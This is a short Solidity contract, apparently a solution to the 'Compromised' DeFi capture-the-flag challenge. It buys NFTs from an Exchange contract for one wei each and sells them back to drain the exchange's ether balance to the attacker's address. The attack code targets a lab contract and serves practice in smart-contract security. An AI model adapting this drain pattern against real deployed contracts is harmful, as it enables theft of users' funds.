pragma solidity ^0.8.0;

import "../compromised/Exchange.sol";

import "hardhat/console.sol";

contract AttackCompromised is IERC721Receiver{
    address payable immutable owner;
    IERC721 immutable nft;
    uint[] private nftIds;

    constructor(address payable _owner, address _nft) {
        owner = _owner;
        nft = IERC721(_nft);
    }

    function onERC721Received(
            address,
            address,
            uint256,
            bytes memory
    ) public virtual override returns (bytes4) {
        return this.onERC721Received.selector;
    }

    function buy(address payable exchange) public payable {
        uint256 times = exchange.balance / 999 ether;

        for (uint i = 0; i < times; i++) {
            uint256 id = Exchange(exchange).buyOne{value: 1}();
            nftIds.push(id);
        }
    }

    function sell(address payable exchange) public payable {
        console.log("balance before:", address(this).balance);
        for (uint i = 0; i < nftIds.length; i++) {
            nft.approve(exchange, nftIds[i]);
            Exchange(exchange).sellOne(nftIds[i]);
        }
        console.log("balance after:", address(this).balance);

        owner.transfer(address(this).balance);
    }

    receive () external payable {}
}
